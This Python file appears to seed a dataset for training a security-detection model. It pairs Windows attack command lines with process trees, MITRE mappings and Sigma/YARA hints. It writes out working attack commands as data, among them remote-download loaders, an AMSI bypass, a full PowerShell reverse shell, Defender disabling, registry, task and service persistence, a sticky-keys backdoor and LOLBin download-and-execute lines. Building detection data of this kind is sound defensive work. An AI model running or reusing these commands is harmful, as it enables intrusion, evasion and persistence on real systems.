"""NivXRay Process-Tree seed dataset.

100+ diverse archetypes across:
    Windows: PowerShell · CMD · WMI · Office · JS · HTA · MSI · LOLBins
             (certutil, bitsadmin, mshta, rundll32, regsvr32, msbuild,
              installutil, cmstp, wmic-xsl, csc, wscript, cscript,
              msiexec, regasm)
    Linux:   bash · curl-pipe · wget-pipe · python · perl · cron · systemd
             · ssh-key · LD_PRELOAD · chattr
    macOS:   osascript · launchctl · plist-persist
    Container: docker · kubectl · ctr
    Ransomware / Cloud CLI / Discovery chains

Each archetype is a TrainingRecord with:
    - raw command  · decoded analysis
    - a canonical ProcessTree (root + children with citations)
    - full SocRationale (verdict, severity, MITRE, tactics, LOLBins,
      Sigma / YARA opportunities, analyst summary)

The dataset is designed to fine-tune NivX Cognis for BOTH classification and
FULL process reconstruction with citation-based anti-hallucination.
"""
from __future__ import annotations
from typing import List

from training.schema import (
    TrainingRecord, ProcessTree, ProcessNode, SocRationale, ProcessEvidence,
)


# --- Compact builders (keep archetype defs terse & readable) ------------ #
def _ev(cite: str, inferred: bool = False, conf: float = 0.9) -> ProcessEvidence:
    return ProcessEvidence(citation=cite, inferred=inferred, confidence=conf)


def _n(process: str, cmd: str = "", action: str = "",
       mitre: List[str] | None = None, tactic: str | None = None,
       lolbin: bool = False, path: str | None = None,
       user: str = "user", integrity: str = "medium", signer: str | None = None,
       inferred: bool = False, cite: str | None = None, conf: float = 0.9,
       children: List[ProcessNode] | None = None) -> ProcessNode:
    return ProcessNode(
        process=process, command_line=cmd or None, executable_path=path,
        user=user, integrity_level=integrity, signer=signer,
        action=action, lolbin=lolbin, mitre_ids=mitre or [], tactic=tactic,
        evidence=_ev(cite if cite is not None else (cmd[:80] if cmd else process), inferred, conf),
        children=children or [],
    )


def _tree(plat: str, root: ProcessNode, verdict: str, severity: str,
          mitre: List[str], tactics: List[str],
          iocs: dict | None = None, lolbins: List[str] | None = None,
          sigma: List[str] | None = None, yara: List[str] | None = None,
          summary: str = "") -> ProcessTree:
    return ProcessTree(
        platform=plat, root=root,
        rationale=SocRationale(
            verdict=verdict, severity=severity, confidence=0.85,
            mitre_ids=mitre, tactics=tactics,
            iocs=iocs or {}, lolbins=lolbins or [],
            sigma_opportunities=sigma or [], yara_opportunities=yara or [],
            analyst_summary=summary,
        ),
    )


def _rec(tid: str, cat: str, plat: str, raw: str, decoded: str,
         tree: ProcessTree, tags: List[str] | None = None,
         diff: str = "medium") -> TrainingRecord:
    return TrainingRecord(
        training_id=tid, platform=plat, category=cat,
        input_raw_command=raw, decoded_script_analysis=decoded,
        predicted_process_tree=tree, tags=tags or [], difficulty=diff,
    )


# ======================================================================= #
#   ARCHETYPES  ·  30 unique + parameter-varied siblings → 100+ total
# ======================================================================= #

_ARCHES: List[TrainingRecord] = []
def _add(r: TrainingRecord): _ARCHES.append(r)


# ─── PowerShell family (10 unique) ───────────────────────────────────────
_add(_rec("NIVX_PS_001", "powershell", "windows",
    "powershell.exe -nop -w hidden -e H4sIAAAA...",
    "Base64 → gzip stager decrypts XOR-shielded payload. IEX spawns cmd.exe.",
    _tree("windows",
        _n("powershell.exe", "powershell.exe -nop -w hidden -e H4sIAAAA...",
           "Base64+gzip stager (obfuscated)",
           ["T1059.001","T1027","T1140"], "execution",
           path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
           signer="Microsoft Windows", cite="powershell.exe -nop -w hidden -e",
           children=[_n("cmd.exe", 'cmd.exe /c "echo Attack_Successful"',
                        "downstream execution",
                        ["T1059.003"], "execution", cite="cmd.exe /c",
                        path=r"C:\Windows\System32\cmd.exe", signer="Microsoft Windows",
                        inferred=True, conf=0.6)]),
        "Obfuscated PowerShell base64+gzip stager", "high",
        ["T1059.001","T1059.003","T1027","T1140"], ["execution","defense-evasion"],
        sigma=["Sigma: powershell.exe with -e/-enc + hidden window"],
        yara=["YARA: H4sI + gzip magic bytes in ps1 arg"],
        summary="Hidden PowerShell decodes base64 gzip, XOR-decrypts and executes cmd."),
    tags=["ps","base64","gzip","xor","stager"], diff="hard"))

_add(_rec("NIVX_PS_002", "powershell", "windows",
    "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-site.com/s.ps1')\"",
    "PowerShell downloads and IEX-executes remote script via WebClient.",
    _tree("windows",
        _n("powershell.exe",
           "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-site.com/s.ps1')\"",
           "IEX remote script downloader",
           ["T1059.001","T1105","T1071.001"], "execution",
           signer="Microsoft Windows",
           cite="IEX(New-Object Net.WebClient).DownloadString"),
        "PowerShell IEX+DownloadString remote loader", "high",
        ["T1059.001","T1105","T1071.001"], ["execution","command-and-control"],
        iocs={"urls":["http://malicious-site.com/s.ps1"], "domains":["malicious-site.com"]},
        sigma=["Sigma: powershell + DownloadString + IEX combo"],
        summary="Classic staging: WebClient downloads remote .ps1, IEX invokes."),
    tags=["ps","iex","downloader"], diff="easy"))

_add(_rec("NIVX_PS_003", "powershell", "windows",
    "powershell -WindowStyle Hidden -NoP -Exec Bypass -w 1 -C \"IWR -Uri http://malicious-site.com -OutFile $env:TEMP\\update.exe; Start-Process $env:TEMP\\update.exe\"",
    "IWR downloads payload to %TEMP%\\update.exe, Start-Process executes.",
    _tree("windows",
        _n("powershell.exe",
           "powershell -WindowStyle Hidden -NoP -Exec Bypass -w 1 -C \"IWR -Uri http://malicious-site.com -OutFile $env:TEMP\\update.exe; Start-Process $env:TEMP\\update.exe\"",
           "IWR downloader + Start-Process",
           ["T1059.001","T1105","T1204.002"], "execution",
           signer="Microsoft Windows", cite="IWR -Uri http://malicious-site.com -OutFile",
           children=[_n("update.exe",
                        r"C:\Users\%USERNAME%\AppData\Local\Temp\update.exe",
                        "Dropped payload executed from temp",
                        ["T1204.002"], "execution",
                        path=r"C:\Users\%USERNAME%\AppData\Local\Temp\update.exe",
                        cite="update.exe", inferred=True, conf=0.65)]),
        "PowerShell IWR downloader spawns update.exe", "high",
        ["T1059.001","T1105","T1204.002"], ["execution","command-and-control"],
        iocs={"urls":["http://malicious-site.com"], "files":["update.exe"]},
        lolbins=["powershell.exe"],
        sigma=["Sigma: IWR + Start-Process in same command line"],
        summary="Hidden PowerShell downloads update.exe to TEMP and executes it."),
    tags=["ps","iwr","downloader","dropper"], diff="medium"))

_add(_rec("NIVX_PS_004", "powershell", "windows",
    "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX((New-Object Net.WebClient).DownloadString('http://a.b/c.ps1'))\"",
    "AMSI bypass via amsiInitFailed then IEX remote payload.",
    _tree("windows",
        _n("powershell.exe",
           "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX((New-Object Net.WebClient).DownloadString('http://a.b/c.ps1'))\"",
           "AMSI bypass + IEX downloader",
           ["T1562.001","T1059.001","T1105"], "defense-evasion",
           cite="amsiInitFailed"),
        "AMSI bypass followed by remote IEX", "critical",
        ["T1562.001","T1059.001","T1105"], ["defense-evasion","execution"],
        iocs={"urls":["http://a.b/c.ps1"], "domains":["a.b"]},
        sigma=["Sigma: amsiInitFailed field access via reflection"],
        yara=["YARA: amsiInitFailed AND SetValue"],
        summary="Disables AMSI, then invokes remote payload — classic offensive tradecraft."),
    tags=["ps","amsi-bypass","evasion"], diff="hard"))

_add(_rec("NIVX_PS_005", "powershell", "windows",
    "powershell -EncodedCommand SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBudAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEALgAyAC4AMwAuADQALwBhACcAKQApAA==",
    "UTF-16LE base64 -EncodedCommand → IEX((New-Object System.Net.WebClient).DownloadString('http://1.2.3.4/a'))",
    _tree("windows",
        _n("powershell.exe",
           "powershell -EncodedCommand SQBFAFgA...",
           "UTF-16LE EncodedCommand IEX downloader",
           ["T1059.001","T1027","T1105"], "execution",
           signer="Microsoft Windows", cite="-EncodedCommand",
           children=[_n("(memory)", "IEX((New-Object System.Net.WebClient).DownloadString('http://1.2.3.4/a'))",
                        "In-memory IEX'd remote script",
                        ["T1059.001","T1105"], "execution",
                        cite="DownloadString('http://1.2.3.4/a')",
                        inferred=True, conf=0.7)]),
        "EncodedCommand PowerShell IEX remote loader", "high",
        ["T1059.001","T1027","T1105"], ["execution","defense-evasion","command-and-control"],
        iocs={"urls":["http://1.2.3.4/a"], "ips":["1.2.3.4"]},
        sigma=["Sigma: powershell -EncodedCommand length > 100"],
        summary="EncodedCommand hides IEX downloader targeting hardcoded IP."),
    tags=["ps","encodedcommand","utf-16le"], diff="medium"))

_add(_rec("NIVX_PS_006", "powershell", "windows",
    "powershell -c \"$b=(New-Object Net.WebClient).DownloadData('http://c2.example/p'); [Reflection.Assembly]::Load($b).GetType('P').GetMethod('R').Invoke($null,$null)\"",
    "Downloads .NET assembly, reflectively loads and invokes P.R().",
    _tree("windows",
        _n("powershell.exe",
           "powershell -c \"$b=(New-Object Net.WebClient).DownloadData('http://c2.example/p'); [Reflection.Assembly]::Load($b).GetType('P').GetMethod('R').Invoke($null,$null)\"",
           "Reflective .NET assembly loader",
           ["T1059.001","T1620","T1105"], "execution",
           cite="[Reflection.Assembly]::Load"),
        "PowerShell reflective assembly loader", "critical",
        ["T1059.001","T1620","T1105"], ["execution","defense-evasion"],
        iocs={"urls":["http://c2.example/p"], "domains":["c2.example"]},
        sigma=["Sigma: Reflection.Assembly Load with DownloadData"],
        summary="Fileless .NET loader — no disk artefacts; hunt via ETW."),
    tags=["ps","reflective-load","fileless"], diff="hard"))

_add(_rec("NIVX_PS_007", "powershell", "windows",
    "powershell -c \"$c=New-Object System.Net.Sockets.TCPClient('10.0.0.5',4444); $s=$c.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$s.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $r=(iex $d 2>&1 | Out-String); $sb=([text.encoding]::ASCII).GetBytes($r); $s.Write($sb,0,$sb.Length) }\"",
    "PowerShell TCP reverse shell to 10.0.0.5:4444; iex'd server commands.",
    _tree("windows",
        _n("powershell.exe",
           "powershell -c \"$c=New-Object System.Net.Sockets.TCPClient('10.0.0.5',4444)...\"",
           "PowerShell TCP reverse shell",
           ["T1059.001","T1071.001","T1095"], "command-and-control",
           cite="TCPClient('10.0.0.5',4444)"),
        "PowerShell reverse-TCP shell", "critical",
        ["T1059.001","T1071.001","T1095"], ["command-and-control","execution"],
        iocs={"ips":["10.0.0.5"]},
        sigma=["Sigma: New-Object TCPClient with $c.GetStream()"],
        summary="Nishang-style reverse shell — TCP to 10.0.0.5:4444, iex loop."),
    tags=["ps","reverse-shell","c2"], diff="medium"))

_add(_rec("NIVX_PS_008", "powershell", "windows",
    "powershell -c \"$k=(3..5);$b=[Convert]::FromBase64String('AQID');for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i%$k.Length]};[System.IO.File]::WriteAllBytes(\\\"$env:TEMP\\p.bin\\\",$b)\"",
    "XOR-decrypt base64 blob with key [3,4,5], drop to %TEMP%\\p.bin.",
    _tree("windows",
        _n("powershell.exe",
           "powershell -c \"$k=(3..5);$b=[Convert]::FromBase64String('AQID')...\"",
           "XOR-decode base64 blob to disk",
           ["T1059.001","T1140","T1027"], "defense-evasion",
           cite="-bxor"),
        "PowerShell XOR loader dropping p.bin", "high",
        ["T1059.001","T1140","T1027"], ["defense-evasion","execution"],
        iocs={"files":["p.bin"]},
        sigma=["Sigma: FromBase64String followed by -bxor loop"],
        yara=["YARA: -bxor with $env:TEMP filepath"],
        summary="Deobfuscator drops XOR-decrypted payload to TEMP for later stage."),
    tags=["ps","xor","dropper"], diff="medium"))

_add(_rec("NIVX_PS_009", "powershell", "windows",
    "powershell -c \"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c calc.exe'\"",
    "PowerShell invokes WMI to spawn cmd.exe /c calc.exe.",
    _tree("windows",
        _n("powershell.exe",
           "powershell -c \"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c calc.exe'\"",
           "WMI process create via PowerShell",
           ["T1047","T1059.001"], "execution",
           cite="Invoke-WmiMethod",
           children=[_n("wmiprvse.exe", "", "WMI provider host",
                        ["T1047"], "execution", inferred=True, conf=0.7,
                        cite="Invoke-WmiMethod",
                        children=[_n("cmd.exe", "cmd.exe /c calc.exe",
                                     "WMI-spawned cmd", ["T1059.003"], "execution",
                                     cite="cmd.exe /c calc.exe",
                                     children=[_n("calc.exe", "calc.exe",
                                                  "Test proxy binary",
                                                  ["T1204"], "execution",
                                                  cite="calc.exe")])])]),
        "PowerShell → WMI → cmd → calc chain", "medium",
        ["T1047","T1059.001","T1059.003"], ["execution"],
        sigma=["Sigma: Invoke-WmiMethod Win32_Process Create"],
        summary="WMI-based lateral execution proxied through wmiprvse."),
    tags=["ps","wmi","lateral"], diff="medium"))

_add(_rec("NIVX_PS_010", "powershell", "windows",
    "powershell.exe -NoP -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath 'C:\\Users\\Public'; Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "Adds Defender exclusion path and disables realtime protection.",
    _tree("windows",
        _n("powershell.exe",
           "powershell.exe -NoP -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath 'C:\\Users\\Public'; Set-MpPreference -DisableRealtimeMonitoring $true\"",
           "Disable Defender via Set-MpPreference",
           ["T1562.001"], "defense-evasion",
           user="SYSTEM", integrity="high",
           cite="Set-MpPreference -DisableRealtimeMonitoring"),
        "PowerShell disables Defender realtime", "critical",
        ["T1562.001"], ["defense-evasion"],
        sigma=["Sigma: Set-MpPreference -DisableRealtimeMonitoring $true"],
        summary="Requires admin — blinds Defender before dropping second stage."),
    tags=["ps","defender-bypass","evasion"], diff="easy"))


# ─── CMD / registry persistence (5 unique) ───────────────────────────────
_add(_rec("NIVX_CMD_001", "cmd", "windows",
    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MaliciousTask /t REG_SZ /d \"cmd.exe /c powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://server/s')\"",
    "HKCU Run persistence: cmd → powershell IEX downloader.",
    _tree("windows",
        _n("reg.exe",
           "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MaliciousTask /t REG_SZ /d \"cmd.exe /c powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://server/s')\"",
           "HKCU Run persistence add",
           ["T1547.001"], "persistence",
           path=r"C:\Windows\System32\reg.exe", signer="Microsoft Windows",
           cite="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
           children=[_n("cmd.exe",
                        "cmd.exe /c powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://server/s')",
                        "Boot-time cmd proxy", ["T1059.003"], "execution",
                        cite="cmd.exe /c powershell.exe", inferred=True, conf=0.7,
                        children=[_n("powershell.exe",
                                     "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://server/s')",
                                     "Downloads and IEX-executes remote stager",
                                     ["T1059.001","T1105"], "execution",
                                     cite="DownloadString('http://server/s')",
                                     inferred=True, conf=0.7)])]),
        "Registry Run persistence dropping remote PowerShell stager", "high",
        ["T1547.001","T1059.003","T1059.001","T1105"], ["persistence","execution"],
        iocs={"urls":["http://server/s"], "domains":["server"]},
        sigma=["Sigma: reg add HKCU Run /d contains powershell + IEX"],
        summary="Boot-time HKCU Run persistence retrieves stager on every login."),
    tags=["cmd","reg","persistence"], diff="medium"))

_add(_rec("NIVX_CMD_002", "cmd", "windows",
    "schtasks /Create /SC ONLOGON /TN \"WindowsUpdate\" /TR \"powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2/x')\" /RL HIGHEST /F",
    "Scheduled task at logon runs hidden PowerShell IEX downloader.",
    _tree("windows",
        _n("schtasks.exe",
           "schtasks /Create /SC ONLOGON /TN \"WindowsUpdate\" /TR \"powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2/x')\" /RL HIGHEST /F",
           "Logon scheduled task creation",
           ["T1053.005"], "persistence",
           path=r"C:\Windows\System32\schtasks.exe", signer="Microsoft Windows", lolbin=True,
           cite="schtasks /Create /SC ONLOGON",
           children=[_n("powershell.exe",
                        "powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2/x')",
                        "Task-invoked stager", ["T1059.001","T1105"], "execution",
                        cite="powershell.exe -w hidden", inferred=True, conf=0.75)]),
        "SCHTASKS on-logon persistence via PowerShell stager", "high",
        ["T1053.005","T1059.001","T1105"], ["persistence","execution"],
        iocs={"urls":["http://c2/x"], "domains":["c2"]},
        lolbins=["schtasks.exe"],
        sigma=["Sigma: schtasks /SC ONLOGON /RL HIGHEST"],
        summary="Highest-privilege logon task fetches remote payload."),
    tags=["cmd","schtasks","persistence"], diff="medium"))

_add(_rec("NIVX_CMD_003", "cmd", "windows",
    "sc create WindowsHelper binPath= \"cmd.exe /c powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.internal/svc')\" start= auto",
    "Service creation running hidden PowerShell downloader.",
    _tree("windows",
        _n("sc.exe",
           "sc create WindowsHelper binPath= \"cmd.exe /c powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.internal/svc')\" start= auto",
           "Service create for persistence",
           ["T1543.003"], "persistence",
           path=r"C:\Windows\System32\sc.exe", signer="Microsoft Windows",
           cite="sc create WindowsHelper",
           children=[_n("services.exe","","Service Control Manager",
                        ["T1543.003"], "persistence", inferred=True, conf=0.7,
                        cite="sc create WindowsHelper",
                        children=[_n("cmd.exe",
                                     "cmd.exe /c powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.internal/svc')",
                                     "Service-invoked cmd", ["T1059.003"], "execution",
                                     cite="powershell.exe -w hidden", inferred=True, conf=0.7)])]),
        "Service persistence spawning PowerShell downloader", "high",
        ["T1543.003","T1059.001","T1105"], ["persistence","execution"],
        iocs={"urls":["http://c2.internal/svc"], "domains":["c2.internal"]},
        sigma=["Sigma: sc create binPath= contains powershell"],
        summary="Auto-start service resurrects payload on every boot."),
    tags=["cmd","service","persistence"], diff="hard"))

_add(_rec("NIVX_CMD_004", "cmd", "windows",
    "cmd.exe /c \"for /f %i in ('whoami') do @echo %i > \\\\attacker\\share\\%COMPUTERNAME%.txt\"",
    "Exfiltrates whoami output via SMB write to attacker share.",
    _tree("windows",
        _n("cmd.exe",
           "cmd.exe /c \"for /f %i in ('whoami') do @echo %i > \\\\attacker\\share\\%COMPUTERNAME%.txt\"",
           "SMB exfiltration via CMD",
           ["T1059.003","T1552","T1041"], "exfiltration",
           cite="\\\\attacker\\share",
           children=[_n("whoami.exe","whoami","User discovery",
                        ["T1033"], "discovery", cite="whoami")]),
        "CMD for-loop exfil to SMB share", "medium",
        ["T1059.003","T1033","T1041"], ["discovery","exfiltration"],
        iocs={"domains":["attacker"]},
        sigma=["Sigma: cmd.exe with UNC path + %COMPUTERNAME%"],
        summary="Discovery output written to attacker-controlled SMB share."),
    tags=["cmd","smb-exfil","discovery"], diff="easy"))

_add(_rec("NIVX_CMD_005", "cmd", "windows",
    "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d cmd.exe /f",
    "IFEO hijack — sticky-keys sethc.exe now launches cmd.exe.",
    _tree("windows",
        _n("reg.exe",
           "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d cmd.exe /f",
           "IFEO Debugger hijack of sethc",
           ["T1546.012"], "privilege-escalation",
           user="SYSTEM", integrity="high",
           cite="Image File Execution Options\\sethc.exe"),
        "Sticky-keys IFEO backdoor", "critical",
        ["T1546.012"], ["privilege-escalation","persistence"],
        sigma=["Sigma: reg add IFEO sethc.exe Debugger"],
        summary="Any user pressing sticky-keys 5x at login screen gets SYSTEM cmd."),
    tags=["cmd","ifeo","backdoor"], diff="hard"))


# ─── LOLBins (12 unique) ─────────────────────────────────────────────────
_add(_rec("NIVX_LOL_001", "lolbin", "windows",
    "certutil.exe -urlcache -split -f http://malicious.io/a.exe %TEMP%\\a.exe && %TEMP%\\a.exe",
    "certutil downloads a.exe from URL cache to TEMP, then executes.",
    _tree("windows",
        _n("cmd.exe","cmd.exe /c ...","Parent shell",
           ["T1059.003"], "execution", inferred=True, conf=0.7, cite="cmd.exe",
           children=[
               _n("certutil.exe",
                  "certutil.exe -urlcache -split -f http://malicious.io/a.exe %TEMP%\\a.exe",
                  "LOLBin download",
                  ["T1105","T1218"], "command-and-control",
                  path=r"C:\Windows\System32\certutil.exe", signer="Microsoft Windows",
                  lolbin=True, cite="certutil.exe -urlcache -split -f"),
               _n("a.exe", r"%TEMP%\a.exe","Dropped binary execution",
                  ["T1204.002"], "execution",
                  path=r"C:\Users\%USERNAME%\AppData\Local\Temp\a.exe",
                  cite="a.exe", inferred=True, conf=0.65),
           ]),
        "Certutil download-and-execute", "high",
        ["T1105","T1218","T1204.002"], ["command-and-control","execution"],
        iocs={"urls":["http://malicious.io/a.exe"], "domains":["malicious.io"], "files":["a.exe"]},
        lolbins=["certutil.exe"],
        sigma=["Sigma: certutil -urlcache -split -f (network)"],
        yara=["YARA: certutil AND -urlcache in cmdline"],
        summary="Classic LOLBin download+execute — perimeter+EDR blind spot."),
    tags=["lolbin","certutil","downloader"], diff="easy"))

_add(_rec("NIVX_LOL_002", "lolbin", "windows",
    "bitsadmin /transfer j http://c2/x.exe %TEMP%\\x.exe && %TEMP%\\x.exe",
    "BITS transfer download-and-execute.",
    _tree("windows",
        _n("bitsadmin.exe","bitsadmin /transfer j http://c2/x.exe %TEMP%\\x.exe",
           "BITS transfer downloader",
           ["T1197","T1105"], "defense-evasion", lolbin=True,
           path=r"C:\Windows\System32\bitsadmin.exe", signer="Microsoft Windows",
           cite="bitsadmin /transfer",
           children=[_n("x.exe", r"%TEMP%\x.exe","Dropped binary",
                        ["T1204.002"], "execution", cite="x.exe",
                        inferred=True, conf=0.65)]),
        "BITS-abused downloader", "high",
        ["T1197","T1105","T1204.002"], ["defense-evasion","command-and-control"],
        iocs={"urls":["http://c2/x.exe"], "domains":["c2"]},
        lolbins=["bitsadmin.exe"],
        sigma=["Sigma: bitsadmin /transfer with HTTP URL"],
        summary="BITS job persists across reboots; can auto-retry download."),
    tags=["lolbin","bitsadmin"], diff="easy"))

_add(_rec("NIVX_LOL_003", "lolbin", "windows",
    "mshta.exe http://malicious.example/x.hta",
    "mshta launches remote HTA — arbitrary VBScript/JScript execution.",
    _tree("windows",
        _n("mshta.exe","mshta.exe http://malicious.example/x.hta",
           "Remote HTA execution",
           ["T1218.005","T1105"], "defense-evasion", lolbin=True,
           path=r"C:\Windows\System32\mshta.exe", signer="Microsoft Windows",
           cite="mshta.exe http://malicious.example/x.hta"),
        "Remote HTA execution via mshta", "high",
        ["T1218.005","T1105"], ["defense-evasion","execution"],
        iocs={"urls":["http://malicious.example/x.hta"], "domains":["malicious.example"]},
        lolbins=["mshta.exe"],
        sigma=["Sigma: mshta.exe with http(s):// arg"],
        summary="mshta bypasses many AV controls when fetching remote HTA."),
    tags=["lolbin","mshta","hta"], diff="easy"))

_add(_rec("NIVX_LOL_004", "lolbin", "windows",
    "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\");",
    "Rundll32 JS protocol handler abuse to spawn calc.",
    _tree("windows",
        _n("rundll32.exe",
           "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\");",
           "JS proto rundll32 → calc",
           ["T1218.011"], "defense-evasion",
           path=r"C:\Windows\System32\rundll32.exe", signer="Microsoft Windows", lolbin=True,
           cite="rundll32.exe javascript:",
           children=[_n("calc.exe","calc.exe","Test proxy binary",
                        ["T1204"], "execution", cite="Run(\"calc\")",
                        inferred=True, conf=0.75)]),
        "Rundll32 JS-scheme execution", "medium",
        ["T1218.011"], ["defense-evasion","execution"],
        lolbins=["rundll32.exe"],
        sigma=["Sigma: rundll32.exe with javascript: prefix"],
        summary="Signed binary proxies arbitrary JS — used for AWL bypass."),
    tags=["lolbin","rundll32","awl-bypass"], diff="medium"))

_add(_rec("NIVX_LOL_005", "lolbin", "windows",
    "regsvr32 /s /n /u /i:http://malicious.io/a.sct scrobj.dll",
    "Squiblydoo — regsvr32 scriptlet from URL.",
    _tree("windows",
        _n("regsvr32.exe",
           "regsvr32 /s /n /u /i:http://malicious.io/a.sct scrobj.dll",
           "Remote scriptlet execution (Squiblydoo)",
           ["T1218.010","T1105"], "defense-evasion",
           path=r"C:\Windows\System32\regsvr32.exe", signer="Microsoft Windows", lolbin=True,
           cite="regsvr32 /s /n /u /i:http"),
        "Squiblydoo remote SCT", "critical",
        ["T1218.010","T1105"], ["defense-evasion","execution"],
        iocs={"urls":["http://malicious.io/a.sct"], "domains":["malicious.io"]},
        lolbins=["regsvr32.exe","scrobj.dll"],
        sigma=["Sigma: regsvr32 with scrobj.dll and http URL"],
        summary="Historical AWL bypass — SCT fetched remotely and executed."),
    tags=["lolbin","regsvr32","squiblydoo"], diff="medium"))

_add(_rec("NIVX_LOL_006", "lolbin", "windows",
    "msbuild.exe C:\\Users\\Public\\a.xml",
    "MSBuild inline task executes attacker C# from XML.",
    _tree("windows",
        _n("msbuild.exe",
           "msbuild.exe C:\\Users\\Public\\a.xml",
           "MSBuild inline task execution",
           ["T1127.001"], "defense-evasion",
           path=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe",
           signer="Microsoft Windows", lolbin=True,
           cite="msbuild.exe C:\\Users\\Public\\a.xml"),
        "MSBuild inline compile-and-run", "high",
        ["T1127.001"], ["defense-evasion","execution"],
        lolbins=["msbuild.exe"],
        iocs={"files":["a.xml"]},
        sigma=["Sigma: msbuild.exe running .xml file"],
        summary="MSBuild compiles + executes attacker C# without touching csc.exe."),
    tags=["lolbin","msbuild","inline-task"], diff="medium"))

_add(_rec("NIVX_LOL_007", "lolbin", "windows",
    "InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Public\\a.exe",
    "InstallUtil executes uninstall method inside attacker binary.",
    _tree("windows",
        _n("installutil.exe",
           "InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Public\\a.exe",
           "InstallUtil AWL bypass",
           ["T1218.004"], "defense-evasion",
           path=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\installutil.exe",
           signer="Microsoft Windows", lolbin=True,
           cite="InstallUtil.exe /logfile="),
        "InstallUtil-based AWL bypass", "high",
        ["T1218.004"], ["defense-evasion","execution"],
        lolbins=["installutil.exe"],
        iocs={"files":["a.exe"]},
        sigma=["Sigma: installutil.exe /LogToConsole=false /U"],
        summary="Uninstall method used as signed loader for arbitrary .NET."),
    tags=["lolbin","installutil"], diff="medium"))

_add(_rec("NIVX_LOL_008", "lolbin", "windows",
    "wmic os get /format:\"http://c2/x.xsl\"",
    "WMIC XSL abuse — remote XSL executes JScript.",
    _tree("windows",
        _n("wmic.exe","wmic os get /format:\"http://c2/x.xsl\"",
           "WMIC XSL remote script",
           ["T1220","T1105"], "defense-evasion",
           path=r"C:\Windows\System32\wbem\wmic.exe", signer="Microsoft Windows", lolbin=True,
           cite="/format:\"http://c2/x.xsl\""),
        "WMIC XSL remote script execution", "high",
        ["T1220","T1105"], ["defense-evasion","execution"],
        iocs={"urls":["http://c2/x.xsl"], "domains":["c2"]},
        lolbins=["wmic.exe"],
        sigma=["Sigma: wmic /format: with http URL"],
        summary="Signed binary proxies remote XSL — evades many AWL solutions."),
    tags=["lolbin","wmic","xsl"], diff="medium"))

_add(_rec("NIVX_LOL_009", "lolbin", "windows",
    "msiexec /q /i http://malicious.example/pkg.msi",
    "msiexec quietly installs remote MSI.",
    _tree("windows",
        _n("msiexec.exe","msiexec /q /i http://malicious.example/pkg.msi",
           "Remote MSI install",
           ["T1218.007","T1105"], "defense-evasion",
           path=r"C:\Windows\System32\msiexec.exe", signer="Microsoft Windows", lolbin=True,
           cite="msiexec /q /i http"),
        "Remote MSI silent install", "high",
        ["T1218.007","T1105"], ["defense-evasion","execution"],
        iocs={"urls":["http://malicious.example/pkg.msi"], "domains":["malicious.example"]},
        lolbins=["msiexec.exe"],
        sigma=["Sigma: msiexec /q /i with http URL"],
        summary="Signed msiexec fetches attacker MSI silently."),
    tags=["lolbin","msiexec","msi"], diff="easy"))

_add(_rec("NIVX_LOL_010", "lolbin", "windows",
    "wscript.exe //E:jscript C:\\Users\\Public\\a.txt",
    "wscript executes JScript from .txt extension bypass.",
    _tree("windows",
        _n("wscript.exe","wscript.exe //E:jscript C:\\Users\\Public\\a.txt",
           "WSH JScript run from .txt",
           ["T1059.007"], "execution",
           path=r"C:\Windows\System32\wscript.exe", signer="Microsoft Windows",
           cite="wscript.exe //E:jscript"),
        "WSH forced-engine JScript execution", "medium",
        ["T1059.007"], ["execution","defense-evasion"],
        iocs={"files":["a.txt"]},
        sigma=["Sigma: wscript.exe //E:jscript in cmdline"],
        summary="Forces JScript engine on a .txt to bypass extension filters."),
    tags=["lolbin","wscript"], diff="easy"))

